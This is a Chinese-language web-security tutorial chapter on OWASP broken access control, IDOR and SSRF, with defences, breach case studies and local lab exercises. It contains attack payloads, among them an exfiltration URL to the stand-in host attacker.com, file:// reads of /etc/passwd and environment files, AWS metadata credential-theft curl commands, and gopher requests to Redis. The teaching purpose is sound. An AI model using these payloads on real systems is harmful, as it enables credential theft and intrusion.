# Ch 4 — A01 Broken Access Control

> 目標：搞懂 OWASP 2025 排第一的風險 — IDOR / 垂直水平越權 / SSRF（2025 併入 A01），怎麼攻、怎麼防。

> **2025 變動**：原本 2021 的 A10 SSRF 被併進 A01，因為 SSRF 本質就是 server 跨 access control 邊界對它本來不該打的目標發 request。本章合併處理。

## 為什麼是 #1

OWASP 統計：**94% 應用程式被測試發現至少 1 個 access control 漏洞**。是 OWASP 史上**從未掉出 Top 5** 的類別，2021 / 2025 連續兩屆排第一。

原因：

- 太依賴前端隱藏（不顯示 admin 按鈕 ≠ 安全）
- 業務邏輯複雜，難全面測試
- 很多人以為「**user 看不到就連不到**」

## Access Control 是什麼

「**確認 user 有權做這個 action**」。

3 個層級：

| 層級 | 例 |
|---|---|
| **Authentication** | 你是誰？（登入） |
| **Authorization** | 你能做什麼？（權限） |
| **Audit** | 你做了什麼？（log） |

Access control = **Authorization**。

---

# Part A — 越權 / IDOR

## 兩種越權

### 1. 垂直越權（Privilege Escalation）

普通 user → admin 權限：

```
 普通 user → /admin/delete-user → 成功？？
```

正確設計：admin endpoint 該檢查 role，不只 URL 隱藏。

### 2. 水平越權（IDOR — Insecure Direct Object Reference）

A user → 看 / 改 B user 的資料：

```
 user A 的 profile URL: /api/users/123/profile
 user A 改成: /api/users/124/profile → 看到 user B 的資料？
```

**現代 web 最常見漏洞**。Bug bounty 報告 30% 是 IDOR。

## 經典 IDOR 場景

### 1. 用戶資料

```
GET /api/users/123/orders
GET /api/users/124/orders   ← 看別人 order
```

### 2. 檔案下載

```
GET /api/files/download?id=42
GET /api/files/download?id=43   ← 下載別人檔
```

### 3. UUID 不算安全

「**改用 UUID 就不會 IDOR 了**」 — **錯**。如果 UUID 在 URL 中暴露（分享連結 / API response 含 list 別人的 ID），仍 IDOR。

UUID 只是「**難猜**」，不是「**有 access control**」。

### 4. Hidden form fields

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="from_account" value="123">
  <input type="number" name="amount">
</form>
```

攻擊者：用 Burp 改 `from_account` 為別人帳號 → 從別人帳戶轉帳。

「**hidden 不代表 server 不接受**」。

## IDOR 攻擊技巧

### 1. 改 ID

最直接。在 Burp / 改 URL：

```
原 URL: /api/users/123
改成:  /api/users/1
       /api/users/124
       /api/users/0
       /api/users/-1
       /api/users/admin
```

### 2. 改 method

```
GET /api/users/123     ← OK，user 看自己
POST /api/users/123    ← 改自己
DELETE /api/users/123  ← 刪別人？
PUT /api/users/123     ← 替換別人？
```

很多 API 只 check GET 沒 check 其他 method。

### 3. Path traversal 嵌入

```
/api/users/123/posts → 看自己 post
/api/users/../admin/users/all → 看全 user？
```

老 server 框架可能有 path normalization 漏洞。

### 4. Header injection

```
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
```

某些反向代理 / framework 認這些 header → bypass auth。

### 5. JWT 改 user_id

```
JWT payload: {"user_id": 123, "role": "user"}
→ base64 解碼改成:
{"user_id": 1, "role": "admin"}
→ 重新 base64 + 簽
```

如果 server 沒 verify signature → 直接過。**alg=none 攻擊**就是這個。

### 6. Race condition

```
user 帳戶餘額 100
同時送 10 個 "提款 100" request
→ 都過 check (餘額 100 >= 100) 但 deduction 累積 → 提了 1000
```

## IDOR 防禦原則

### 1. Deny by default

預設拒絕，明確 allow。**白名單 > 黑名單**。

### 2. Server-side check

**永遠在 server 檢查**。前端 hide / disable 不是安全機制。

```python
# 錯
if user.is_admin:
    show admin_button
# server 沒檢查 admin_button 後面的 endpoint

# 對
@app.route('/admin/delete-user/<id>')
@require_admin   # ← server-side check
def delete_user(id):
    ...
```

### 3. Object-level check（防 IDOR）

每次 access 一個 object，check「**這 user 有權嗎**」：

```python
@app.route('/api/users/<id>/profile')
def get_profile(id):
    if int(id) != current_user.id and not current_user.is_admin:
        abort(403)
    return user_profile(id)
```

### 4. Use frameworks（不要自己寫）

主流 framework 有 RBAC / ABAC library：

- Spring Security
- Django permissions
- Laravel Gates / Policies
- Node Express + middleware

### 5. Log 所有 access denied

異常 access 模式可能是攻擊試探：

```
[WARN] User 5 attempted to access /api/users/123/profile (denied)
```

## IDOR 真實案例：USPS（2018）

USPS 網站的 Informed Visibility API：

- 有 6000 萬用戶資料
- 任何登入用戶能 query「**任何別人的**」郵件追蹤資料、地址、email
- IDOR + 沒做 object-level access check

被研究員發現後 USPS **拒絕修一年多**才修。

教訓：**大組織也常犯 IDOR，因為功能設計時沒想到 access boundary**。

---

# Part B — SSRF (Server-Side Request Forgery)

## SSRF 是什麼

「**騙 server 對 attacker 指定的 URL 發 request**」。SSRF 在 OWASP 2021 是獨立的 A10，**2025 併入 A01** — 因為它本質是 server 越過自己的 access boundary 對內部資源發出請求。

vulnerable code：

```python
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)   # 拿 user 給的 URL
    return response.text
```

正常用法：取 `https://example.com/data.json`。

attacker：

```
?url=http://localhost/admin
?url=file:///etc/passwd
?url=http://169.254.169.254/latest/meta-data/   ← AWS metadata
```

## 為什麼 SSRF 危險

server 通常：

- 在內網能 access internal services
- 有 cloud credentials
- 跨 firewall

「**server-side**」攻擊讓 attacker 從 internet 跳到「**internal**」。

## 經典 SSRF 攻擊

### 1. Cloud metadata service

AWS / GCP / Azure 提供 metadata service 給 EC2 instance：

```
AWS:    http://169.254.169.254/latest/meta-data/
GCP:    http://metadata.google.internal/
Azure:  http://169.254.169.254/metadata/instance
```

任何 process（含 web server）能 access。**含 IAM credentials**！

```bash
# 在 EC2 instance 內部
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 拿到 IAM role name，然後：
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# 拿到 access key + secret + token
```

如果 web app 有 SSRF → attacker 從外部能 trigger 這 request → 拿到 IAM creds → access 整個 AWS account。

「**Capital One 2019 大 breach**」就是這個（再講後面）。

#### 防禦：IMDSv2

AWS 2019 推 Instance Metadata Service v2：

- 必先 PUT 拿 token
- token 有 hop limit（防 SSRF）
- 強制 header (`X-aws-ec2-metadata-token`)

新 EC2 該強制 IMDSv2：

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required
```

### 2. 內網掃描

```
?url=http://192.168.1.1
?url=http://10.0.0.1:22
?url=http://internal-api.local
```

server 對 internal IP 發 request → response time / status code 告訴 attacker 哪些 IP / port 開。

進階：full port scan via SSRF。

### 3. 內部 service 攻擊

```
?url=http://localhost:6379/             ← Redis（沒 auth）
?url=http://localhost:9200/_cat/indices  ← Elasticsearch
?url=http://localhost:8080/manager/html  ← Tomcat manager
```

內部 service 通常沒設密碼（「反正只有內網能 access」）→ SSRF 把它變對外。

### 4. file:// scheme

```
?url=file:///etc/passwd
?url=file:///proc/self/environ    ← env vars
?url=file:///app/.env
```

讀本機檔案。看 library 是否支援 `file://`：

- Python `requests`: 不支援（好）
- Python `urllib`: 支援（壞）
- Java HttpURLConnection: 支援
- PHP `file_get_contents`: 支援

修：限制 scheme 為 `http(s)://`。

### 5. Gopher / Other schemes

```
?url=gopher://internal-redis:6379/_SET%20key%20value
```

`gopher://` 能送任意 byte → 跟任意 TCP service 互動（包括 Redis / Memcached / SMTP）。

```
?url=dict://internal:11211/STAT
?url=ftp://internal/
```

## Blind SSRF

server 不回 response，但你想知道 internal info。

### Out-of-band

讓 server 對 attacker controlled domain 發 request：

```
?url=http://attacker.com/?leak=
```

attacker DNS / web server 看 log → 確認 SSRF + 拿到 server IP。

進階：把資料 encode 在 DNS query：

```
?url=http://<base64-of-secret>.attacker.com/
```

attacker DNS log 看到 → decode 拿 secret。

### Time-based

```
?url=http://internal:3306    ← MySQL port，可能 hang
```

response time = 開 / 關。

## SSRF 防禦

### 1. 白名單 URL

```python
ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https') and parsed.hostname in ALLOWED_DOMAINS
```

最安全。

### 2. Block private IP

```python
import ipaddress

def is_private(ip):
    addr = ipaddress.ip_address(ip)
    return addr.is_private or addr.is_loopback or addr.is_link_local

# Resolve hostname → IP → check
ip = socket.gethostbyname(hostname)
if is_private(ip):
    abort(400)
```

但要小心：

- DNS rebinding：DNS resolve 第一次回 public IP，第二次回 internal（race）
- Redirect：first request OK，redirect 到 internal
- IPv6 (`::1`, `fe80::`)
- 各種特殊位址（`169.254.169.254`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `0.0.0.0`）

完整 block 列表很長，**用 library**：

```python
import socket, ipaddress
from urllib.parse import urlparse

def safe_get(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Blocked")
    return requests.get(url, allow_redirects=False)   # 不 follow redirect
```

### 3. 限制 scheme

只允許 `http(s)://`，禁 `file://` / `gopher://` / `dict://` / 等。

### 4. Network segmentation

server 不該能 access metadata / internal sensitive service。

- VPC firewall block 169.254.169.254（除了 instance 自己 metadata access）
- 不必要 service 不開
- 用 IMDSv2

### 5. Out-of-band callback 偵測

部署 server 端 monitoring：對 unexpected outbound request 發 alert。

## SSRF 真實案例：Capital One（2019）

1.06 億 美國信用卡 customer 資料外洩，**SSRF 是主因**：

```
1. Capital One 用 ModSecurity WAF
2. WAF 配置 misconfig 有 SSRF
3. attacker 用 SSRF 對 EC2 metadata 發 request
4. 拿到 IAM role credentials
5. 用 IAM role access S3
6. 從 S3 download 1 億 customer 資料
```

關鍵：

- WAF 本身是 SSRF entry
- IMDSv1（沒 hop limit）→ SSRF 直接拿 token
- IAM role 過廣（讀整個 S3）

**4 個層級全部失誤** = 災難。教訓：defense in depth 真的重要。

修補：

- IMDSv2 mandatory
- WAF 配置嚴格 review
- IAM least privilege（只讀必要 bucket）
- VPC endpoint（讓 EC2 不需要走 metadata）

---

## 動手練習

### IDOR 練習

**1. Juice Shop A01 challenges**

```bash
# 已知 challenges 包含：
# - "View Basket" - 改 basket ID
# - "View Another User's Cart"
# - "Forged Feedback"
# - "Reset Jim's Password"

# 訪問 http://localhost:3000/#/basket
# 用 Burp 改 basket ID
```

**2. DVWA — Insecure Direct Object References**

DVWA 有專門 IDOR 練習。完成 low / medium / high 三難度。

**3. 寫 vulnerable code**

```python
# vulnerable.py
from flask import Flask, request, abort

app = Flask(__name__)

users = {
    1: {'name': 'Alice', 'email': 'alice@a.com', 'role': 'user'},
    2: {'name': 'Bob', 'email': 'bob@b.com', 'role': 'admin'},
}

@app.route('/users/<int:user_id>')
def get_user(user_id):
    # 沒檢查 access control！
    return users.get(user_id, {})
```

```bash
curl http://localhost:5000/users/1   # 拿到 alice
curl http://localhost:5000/users/2   # 拿到 bob (admin) — 不該！
```

修法：

```python
@app.route('/users/<int:user_id>')
def get_user(user_id):
    if not session.get('user_id') == user_id:
        if not session.get('is_admin'):
            abort(403)
    return users.get(user_id, {})
```

**4. Burp Intruder 自動掃 IDOR**

對 `/api/users/{id}` endpoint，Intruder 跑 1-1000 ID，看 response 變化。

### SSRF 練習

**5. 寫 vulnerable SSRF + 攻**

```python
# vulnerable.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    return requests.get(url).text

if __name__ == '__main__':
    app.run(port=5000)
```

```bash
# 攻擊（在自己機器跑）
curl 'http://localhost:5000/fetch?url=http://localhost:5000/'   # 自己訪問自己
curl 'http://localhost:5000/fetch?url=file:///etc/passwd'        # 視 lib 而定
curl 'http://localhost:5000/fetch?url=http://169.254.169.254/'   # 在 EC2 上 → metadata
```

**6. 修 vulnerable**

```python
import socket, ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            return False
        return True
    except:
        return False

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    if not is_safe_url(url):
        abort(400)
    return requests.get(url, allow_redirects=False).text
```

**7. Burp Collaborator**

Burp 內建「Collaborator」 — attacker controlled domain，能看 callback。在 SSRF 測試送 server 該 URL，Burp 看 DNS / HTTP callback → 確認 SSRF。

**8. PortSwigger Academy SSRF**

https://portswigger.net/web-security/ssrf — 完整 lab 含 blind SSRF / DNS rebinding。

**9. Juice Shop SSRF**

「Server-Side Request Forgery」challenge。

## 自我檢核

### IDOR / 越權

- [ ] 講得出垂直 vs 水平越權差別
- [ ] 知道 IDOR 為什麼最常見
- [ ] 6+ 種 IDOR 攻擊方法（改 ID / method / header / JWT / race）
- [ ] 防禦 5 原則記得
- [ ] 在 Juice Shop / DVWA 實作過 IDOR
- [ ] 寫 / 修過 vulnerable code

### SSRF

- [ ] SSRF 基本攻擊原理
- [ ] Cloud metadata 攻擊（特別 AWS）
- [ ] 4+ 種 SSRF 攻擊變形（內網 / file:// / gopher / blind）
- [ ] 知道 IMDSv2 為什麼重要
- [ ] 防禦：白名單 + private IP block + scheme 限制
- [ ] Capital One breach 流程清楚
- [ ] 知道 2025 為什麼把 SSRF 併入 A01

下一章看 A02 Security Misconfiguration — 配置失誤（2025 從 #5 升到 #2）。

→ [Ch 5 A02 Security Misconfiguration](./05-a02-misconfiguration.md)
